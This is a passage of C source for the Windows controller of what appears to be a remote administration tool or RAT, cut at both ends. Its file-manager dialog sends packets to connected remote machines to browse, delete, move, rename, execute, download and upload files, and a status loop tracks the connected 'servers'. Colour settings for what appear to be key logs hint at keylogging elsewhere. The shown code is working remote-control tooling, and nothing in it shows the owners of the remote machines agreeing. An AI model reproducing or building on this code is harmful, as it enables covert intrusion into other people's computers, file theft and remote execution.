				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_DOWNLOAD));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
                   
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			
				}
			}
			break;


	 
	
		}
		break;
	
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_SEARCH:
			GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			Head.ID = atoi(WindowOut);
			
			GetWindowText(GetDlgItem(hWnd, IDC_FILENAME), Head.Buf, 100);
			GetWindowText(GetDlgItem(hWnd, IDC_DIR), Head.Buf2, 50);
			Head.PacketType = PACKET_FILE_MANAGER_SEARCH;
			SentKb+=send(Client[Head.ID], (char *)&Head, sizeof(PACKETHEAD), 0);
			break;
		case IDC_RESET:
			{
			ResetProcs(hWnd, IDC_DOWNLOADS);
			}
			break;
	/*	case IDC_ENTERDIR:
			{	GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				strcpy(Text, "A");
				GetWindowText(hWnd, WindowOut, 10);
			    WindowOutY[0] = WindowOut[0];
			    Head.ID = atoi(WindowOutY);
			    	

				item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FOLDERS),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FOLDERS),&item);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				if(!strcmp(Text, "A"))
				{
				break;
				}
				strcat(FinalDir, Text);
				strcat(FinalDir, "\\");
				strcpy(Head.Data, FinalDir);


				SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);

				SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				
			}
			break;*/
		case IDC_DELETEFILE:
			{	GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				if(MessageBox(NULL, "Are you sure you want Delete this file?", "Delete", MB_YESNO | MB_ICONWARNING) == IDYES)
				{
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
				
				strcpy(Text, "");
			    item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(Head.Data, FinalDir);
				//strcat(Head.Data, "\\");
				strcat(Head.Data, Text);
				ListView_DeleteItem(GetDlgItem(hWnd,IDC_FILELIST),ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED));
				
				Head.PacketType = PACKET_FILE_MANAGER_DELETE_FILE;
				SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				
				strcpy(Head.Data, "");
				sprintf(Head.Data, "Deleted: %s", Text);
				GetTime();
				SetLogs(Time, "File Delete", Head.Data , "Pass");
//				ResetProcs(hwnd, IDC_TASKLIST)
			/*	ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				strcpy(Head.Data, FinalDir);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);*/
				}
				else
				{
				break;
				}
			    
			}

			break;
		case IDC_COPY:
		{       GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
			    J = 0;
                item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(FileName, Text);
				strcpy(Copy, FinalDir);
				strcat(Copy, Text);
			
		}
			break;
		case IDC_PASTE:
		{   GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
				

			    strcpy(Head.Data, FinalDir);
				strcat(Head.Data, FileName);
			    strcpy(Head.Buf, Copy); 
				if(J == 0)
				{
				Head.PacketType = PACKET_FILE_MANAGER_FILE_COPY;
				}
				else
				{
				Head.PacketType = PACKET_FILE_MANAGER_FILE_CUT;
				}

				SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);

				
				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				strcpy(Head.Data, FinalDir);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;

				SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);
				if(J == 1)
				{
				strcpy(Copy, "");
				strcpy(Head.Buf, "");
				}
			    				
		}
			break;
		case IDC_MOVE:
			{
				GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				J = 1;
                item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Text;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
				strcpy(FileName, Text);
				strcpy(Copy, FinalDir);
				strcat(Copy, Text);
			
			
			}
			break;
		case IDC_RENAME:
			{GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
			V = 1;
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
			

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
			strcpy(FileName, Text);
			strcpy(Copy, FinalDir);
			strcat(Copy, Text);
		    CreateThread(NULL, 0, NameWindow,(LPVOID)Head.ID, 0, &thread);
			}
			break;
		case IDC_RENAME_FOLDER:
			{GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
			V = 0;
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
				
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FOLDERS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FOLDERS),&item);
			strcpy(FileName, Text);
			strcpy(Copy, FinalDir);
			strcat(Copy, Text);
			CreateThread(NULL, 0, NameWindow,(LPVOID)Head.ID, 0, &thread);
			}
			break;
		case IDC_NEW_FOLDER:
			{
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
			
			Head.PacketType = PACKET_FILE_MANAGER_NEW_FOLDER;
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
			
			strcpy(Head.Data, FinalDir);
			SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(Head), 0);
////////////////////////////////////////////////////////////////////////////////////
			ResetProcs(hWnd, IDC_FOLDERS);
			ResetProcs(hWnd, IDC_FILELIST);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;

			SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);
			}
			break;
		case IDC_BACK:
			{GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				int D = 0;
				while( FinalDir[D] != NULL)
				{
				D++;
				}
				if(D == 3 && FinalDir[1] == ':')
				{
				break;
				}
				D--;
				FinalDir[D] = '\0';
				D--;
				while(FinalDir[D] != '\\')
				{
				FinalDir[D] = '\0';
				D--;
				}

				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				strcpy(Head.Data, FinalDir);

				SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)FinalDir);

				ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
			SentKb+=send(Client[Head.ID],(char*)&Head, HeadSize, 0);
			}
			break;
		case IDC_FIND:
			    GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
          if(SearchHwnd[Head.ID] == NULL)
		  {
			CreateThread(NULL, 0,SearchWindow,(LPVOID)Head.ID, 0, &thread);
		  }
		  else
		  {
		  }
			break;
		case IDC_STOP:
			GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			Head.ID = atoi(WindowOut);

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=3;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);
		//	MessageBox(NULL, Text, "Text", MB_OK);

			Head.ID2 = atoi(Text);
			Head.ID3 = 1;
			Head.PacketType = PACKET_FILE_DOWNLOAD_STAT;

			SentKb+=send(Client[Head.ID],(char *)&Head, HeadSize, 0);

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);

			item.mask=TVIF_TEXT | TVIF_IMAGE;
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);

			item.iImage = 6;
			item.iSubItem=0;
			item.pszText=Text;
			item.iItem=ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);

	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);
			break;
		case IDC_PAUSE:
			GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			Head.ID = atoi(WindowOut);

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=3;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);
		//	MessageBox(NULL, Text, "Text", MB_OK);

			Head.ID2 = atoi(Text);
			Head.ID3 = 2;
			Head.PacketType = PACKET_FILE_DOWNLOAD_STAT;

			SentKb+=send(Client[Head.ID],(char *)&Head, HeadSize, 0);
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);

			item.mask=TVIF_TEXT | TVIF_IMAGE;
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);

			item.iImage = 5;
			item.iSubItem=0;
			item.pszText=Text;
			item.iItem=ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);
			break;
		case IDC_RESUME:
			GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			Head.ID = atoi(WindowOut);

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=3;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);

			Head.ID2 = atoi(Text);
			Head.ID3 = 3;
			Head.PacketType = PACKET_FILE_DOWNLOAD_STAT;
		//	MessageBox(NULL, Text, "Text", MB_OK);
			SentKb+=send(Client[Head.ID],(char *)&Head, HeadSize, 0);

			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_DOWNLOADS),&item);

			item.mask=TVIF_TEXT | TVIF_IMAGE;
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_DOWNLOADS),-1,LVNI_SELECTED);

			item.iImage = 4;
			item.iSubItem=0;
			item.pszText=Text;
			item.iItem=ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);
			break;

		case IDC_EXECUTE:
			Head.PacketType = PACKET_FILE_MANAGER_FILE_EXECUTE;
			GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
			GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			Head.ID = atoi(WindowOut);
			
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
			
			strcat(FinalDir, Text);	
			
			strcpy(Head.Data, FinalDir);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_EXECUTE;
			SentKb+=send(Client[Head.ID],(char *)&Head, HeadSize, 0);
			break;
		case IDC_DOWNLOAD:
			ZeroMemory(&Head, sizeof(PACKETHEAD));
			ZeroMemory(FinalDir, sizeof(FinalDir));
			ZeroMemory(filename, sizeof(filename));

			GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
						GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
				
			item.iItem=ListView_GetNextItem(GetDlgItem(hWnd,IDC_FILELIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Text;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hWnd,IDC_FILELIST),&item);
			
				strcpy(Buffer, "");
				sprintf(Buffer, "Downloading: %s", Text);
				GetTime();
				SetLogs(Time, "Download", Buffer , "Pass");

			strcat(FinalDir, Text);

			for(i=0; i<strlen(FinalDir)-1; i++)
                  if(FinalDir[i] == '\\')
				  {
                     FinalDir[i] = '/';
				  }
               strcpy(Head.Data, FinalDir); 

               i = strlen(Head.Data)-1;
               
               while(Head.Data[i] != '/') 
			   {
                  i--;
			   }
               i++; 

               for(;i<(strlen(Head.Data));i++)
			   {
                  filename[j] = Head.Data[i];
                  j++;
               }
			if(D == 1025)
			{
			D = 0;
			}
		   Head.PacketType = PACKET_FILE_MANAGER_FILE_DOWN;
		   Head.ID2 = D;
		   Head.ID3 = ListView_GetItemCount(GetDlgItem(hWnd,IDC_DOWNLOADS));

		   DOWN[D] = fopen(filename, "wb");
		   if(DOWN[D] == NULL)
		   {
			//MessageBox(NULL, "NULL", "NULL", MB_OK);
			   break;
		   }
		   else
		   {
			//MessageBox(NULL, "Success Opening", "Success", MB_OK);
		   }

	item.mask=TVIF_TEXT | TVIF_IMAGE;
	item.iItem=D;

	item.iImage = 4;
	item.iSubItem=0;
	item.pszText=filename;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);

	sprintf(Buffer, "%d", D);

	item.iSubItem=1;
	item.pszText="Download";
	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);

	item.iSubItem=2;
	item.pszText="Waiting...";
	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);

	item.iSubItem=3;
	item.pszText=Buffer;
	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);
	SentKb+=send(Client[Head.ID],(char *)&Head, HeadSize, 0);
		   D++;
			break;

		case IDC_UPLOAD:
		{
		 GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
		 OPENFILENAME ofn;
         
         
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);

         ZeroMemory(&ofn, sizeof(ofn));
         ZeroMemory(&Head, sizeof(Head));

         GetWindowText(hWnd, WindowOut, 10);
		 WindowOutY[0] = WindowOut[0];
		 Head.ID = atoi(WindowOutY);

         ofn.lStructSize = sizeof(ofn);
         ofn.hwndOwner = FileHwnd[Head.ID];
         ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
         ofn.lpstrFile = Head.Buf;
         ofn.nMaxFile = MAX_PATH;
         ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST;
         ofn.lpstrDefExt = "";
               
         		strcpy(Buffer, "");
				sprintf(Buffer, "Uploading: %s", Head.Buf);
				GetTime();
				SetLogs(Time, "Upload", Buffer , "Pass");

            if(GetOpenFileName(&ofn))
            {
               ZeroMemory(filename, sizeof(filename));
              
               for(i=0; i<strlen(Head.Buf)-1; i++)
                  if(Head.Buf[i] == '\\')
				  {
                     Head.Buf[i] = '/';
				  }
               strcpy(Head.Data, Head.Buf);     
               i = strlen(Head.Buf)-1;
               
               while(Head.Buf[i] != '/') 
			   {
                  i--;
			   }
               i++; 
               
               for(;i<(strlen(Head.Buf));i++)
			   {
                  filename[j] = Head.Buf[i];
                  j++;
               }		   strcpy(Head.Buf2, FinalDir);
               for(i=0; i<strlen(Head.Buf2); i++)
			   {
                  if(Head.Buf2[i] == '\\')
				  {
                     Head.Buf2[i] = '/';
				  }
			   }
			
			  strcat(Head.Buf2, filename);

		
			Head.PacketType = PACKET_FILE_MANAGER_FILE_RECV_S;
			GetWindowText(hWnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
			Head.ID2 = U;
			SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(Head), 0);
			CreateThread(NULL, 0, SendFile,(LPVOID)Head.ID, 0, &thread);
			}  
	}
         break;
	         	case IDCANCEL:
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					FileHwnd[Head.ID] = NULL;
					EndDialog(hWnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI SendFile(LPVOID lpParam)
{
   PACKETFILE		File;
   DWORD			FileSize=sizeof(PACKETFILE);
   
   int ID = (int)lpParam;
   int d = U;
   
   if(U > 1023)
   {
	U = 0;
   }
   U++;
   char FilePath [1024] = "";
   strcpy(FilePath, Head.Data);
   int Error = 0;
   char IDA[10] = "";
   unsigned long int pos = 0;
   unsigned long int length = 0;
   unsigned long int Nsize = 0;
   unsigned long int NextSize = 0;
   int ItemIndex = 0;
   char UPBUF [30] = "";
   ItemIndex = ListView_GetItemCount(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS));
   	sprintf(IDA, "%d", ItemIndex);
	strcpy(IDA, "");
	LV_ITEM	 item;
	item.mask=TVIF_TEXT | TVIF_IMAGE;
	item.iItem=ItemIndex;

	item.iImage = 7;
	item.iSubItem=0;
	item.pszText=Head.Data;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

	item.iImage = 7;
	item.iSubItem=1;
	item.pszText="Upload";
	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

	item.iImage = 7;
	item.iSubItem=2;
	item.pszText=" ";
	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);
	
	fd[d] = fopen(FilePath, "rb");
    pos = ftell(fd[d]);
    fseek(fd[d], 0, SEEK_END);
    length = ftell(fd[d]);      
    fseek(fd[d], pos, SEEK_SET);
	SentKb+=length;
        NextSize = length - Nsize;
	    ZeroMemory(UPBUF, sizeof(UPBUF));
        sprintf(UPBUF,"%d Bytes / %d Bytes", Nsize, length);
				
	   	item.iSubItem=2;
	    item.pszText=UPBUF;
	    ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);

while(Nsize < length)
{
	ZeroMemory(&File, sizeof(File));
	NextSize = length - Nsize;
	 sprintf(UPBUF,"%d Bytes / %d Bytes", Nsize, length);	
	   
	 
	    item.mask=TVIF_TEXT;
	    item.iItem=ItemIndex;

	    item.iSubItem=2;
	    item.pszText=UPBUF;
	    ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);
	  
	  if(NextSize < 4096)
	   {
		fread(File.Data, 1, NextSize, fd[d]);
		
        SendAgain4k:
		File.ID2 = d;
	    File.ID3 = NextSize;                                 
		File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
        if(send(FClient[ID], (char *)&File, sizeof(File), 0) == SOCKET_ERROR)
		{
		 goto SendAgain4k;
		}
		break;

	   }

		fread(File.Data, 1, sizeof(File.Data), fd[d]);
SendAgain:
		File.ID2 = d;
	    File.ID3 = 4096;                                 
		File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
        if(send(FClient[ID], (char *)&File, sizeof(File), 0) == SOCKET_ERROR)
		{
		 goto SendAgain;
		}

	
		Nsize += sizeof(File.Data);
		 //percent+=unit;
}
   

        fclose(fd[d]);
        ZeroMemory(UPBUF, sizeof(UPBUF));
	   	
	ZeroMemory(&File, sizeof(File));
Try:
	File.PacketType = PACKET_FILE_MANAGER_FILE_C;
	File.ID2 = d;
    if(send(FClient[ID], (char *)&File, sizeof(File), 0) == SOCKET_ERROR)
	{
	goto Try;
	}
	else
	{	
    	item.mask=TVIF_TEXT;
	    item.iItem=ItemIndex;

	    item.iSubItem=2;
	    item.pszText="Complete";
	    ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_DOWNLOADS),&item);
	}
    WSASetLastError(0);

    return 0;  
}
LRESULT CALLBACK MainProc(HWND Dlg,UINT message,WPARAM wParam,LPARAM lParam);

DWORD WINAPI FileConnectWindow(LPVOID lpParam)
{
   
	Connect=CreateDialog(CInst,(LPCTSTR)IDD_CONNECT,NULL,(DLGPROC)FileConnectProc);
	ShowWindow(Connect,SW_HIDE);	
	MSG msg;
	while(GetMessage(&msg,Connect,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
int Reply = 0;
DWORD WINAPI FileWindow(LPVOID lpParam)
{
    FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [20] = "";
	char COMPUTER [50] = "";
	int LID = (int) lpParam;
    char IDA [10] = "";
	HICON hIcon;

	strcpy(COMPUTER, WINDOWIP);

	FileHwnd[LID]=CreateDialog(FileInst,(LPCTSTR)IDD_FILE,NULL,(DLGPROC)FileProc);
	ShowWindow(FileHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(FileHwnd[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"File Manager | %s", COMPUTER);
	sprintf(IDA, "%d", LID);
	
	SetWindowText(FileHwnd[LID], WindowText);
	SetWindowText(GetDlgItem(FileHwnd[LID], IDC_ID), IDA);

	Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
	Head.ID = LID; 
	strcpy(Head.Data, "");
    SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(FileHwnd[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(FileHwnd[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,FileHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
HINSTANCE SetInst;
int Connections = 0;
char ConnectionsA [20];
DWORD WINAPI CheckStatus(LPVOID lpParam)
{
int W = 0;
int GID = 0;
char Stat [256] = "";
PACKETHEAD  Check;
LV_ITEM		item;
char Buffer [1024] = "";
char PingBuffer [100] = "";
int Ping = 0;
while(1)
{
while(W <= ListView_GetItemCount(GetDlgItem(HwND,IDC_SERVERLIST)))
			{
	        item.iItem=W;
			item.mask=LVIF_TEXT | LVIF_IMAGE;
			item.iSubItem=0;
			item.pszText=Stat;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

			item.iItem=W;
			item.mask=LVIF_TEXT | LVIF_IMAGE;
			item.iSubItem=0;
			item.pszText=PingBuffer;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
		//MessageBox(NULL, PingBuffer, "PingBuffer", MB_OK);
			GID = atoi (Stat);
			
			if(!strcmp(Stat, ""))
			{
			//MessageBox(NULL, "stat == nothing","STAT", MB_OK);
			break;
			}

			Check.PacketType = STATUSA;
			Sleep(10000);

			ZeroMemory(Buffer, sizeof(Buffer));		
			sprintf(Buffer, "Sent: %d KB / Recv: %d KB", SentKb / 1024, RecvKb / 1024);
			SendMessage(GetDlgItem(HwND,IDC_MAIN_STATUS) , SB_SETTEXT, 2, (LPARAM)Buffer);

				if(send(Client[GID],(char *)&Check, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
				{
					if(WSAGetLastError() == WSAECONNRESET)
					{
					Connections--;
					strcpy(ConnectionsA, "");
					sprintf(ConnectionsA, "Connections: %d",Connections); 
					SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);

					ListView_DeleteItem(GetDlgItem(HwND,IDC_SERVERLIST),W);
					closesocket(Client[GID]);
					}
				}
				else
				{
				
			      Ping = 0;
				/*  while(Reply == 2000)
				  {
				   Ping++;
				   Sleep(1);
				  }
				  ZeroMemory(Stat, sizeof(Stat));
				  if(Ping < 300)
				  {
				  sprintf(PingBuffer, "%d", Reply);
				  item.iItem=W;
				  item.iSubItem=0;
				  item.mask=LVIF_TEXT | LVIF_IMAGE;
			      item.iImage = 3;
				  item.pszText=PingBuffer;
			      ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
				  //MessageBox(NULL, Buffer, "Buffer", MB_OK);
				  goto end;
				  }
				 
				  if(Ping > 300)
				  {						
					  if(Ping < 699)
					  {
				  sprintf(PingBuffer, "%d", Reply);
				  item.iItem=W;
				  item.iSubItem=0;
				  item.mask=LVIF_TEXT | LVIF_IMAGE;
				  item.iImage = 1;
				  item.pszText=PingBuffer;
			      ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
				  goto end;
				  //MessageBox(NULL, Buffer, "Buffer", MB_OK);
					  }

				  sprintf(PingBuffer, "%d", Reply);
				  item.iSubItem=0;
				  item.iItem=W;
				  item.mask=LVIF_TEXT | LVIF_IMAGE;
				  item.iImage = 2;
				  item.pszText=PingBuffer;
			      ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
				 // MessageBox(NULL, Buffer, "Buffer", MB_OK);
				  }*/
end:

			 ZeroMemory(Buffer, sizeof(Buffer));
			 sprintf(Buffer, "%d", dwTextColor);
			 SetWindowText(GetDlgItem(HwND, IDC_KEYCOLOUR) ,Buffer);

			 ZeroMemory(Buffer, sizeof(Buffer));
			 sprintf(Buffer, "%d",dwTimeColor );
			 SetWindowText(GetDlgItem(HwND, IDC_KEYCOLOUR2) ,Buffer);

			 ZeroMemory(Buffer, sizeof(Buffer));
			 sprintf(Buffer, "%d", dwTitleColor);
			 SetWindowText(GetDlgItem(HwND, IDC_KEYCOLOUR3) ,Buffer);

			 
			 ZeroMemory(Buffer, sizeof(Buffer));
			 sprintf(Buffer, "%d", dwBackColor);
			 SetWindowText(GetDlgItem(HwND, IDC_KEYCOLOUR4) ,Buffer);
				}
				Reply = 2000;
				Ping = 0;
				W++;
			}
Sleep(1000);
W=0;
}
return 0;
}


/////////////////////////////////////////////////////////////////////////////////////////////////
//EULA
LRESULT CALLBACK EULAProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
 HANDLE hFile;
 LPSTR pszFileText;
 int Select;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		SendMessage(hwnd, WM_SETICON,ICON_SMALL,IDI_ARYAN);
		SendMessage(hwnd, WM_SETICON,ICON_BIG,IDI_ARYAN);

        hFile = CreateFile("eula.txt", GENERIC_READ, FILE_SHARE_READ, NULL,OPEN_EXISTING, 0, NULL);
				 if(hFile != INVALID_HANDLE_VALUE)
				{
				 DWORD dwFileSize;

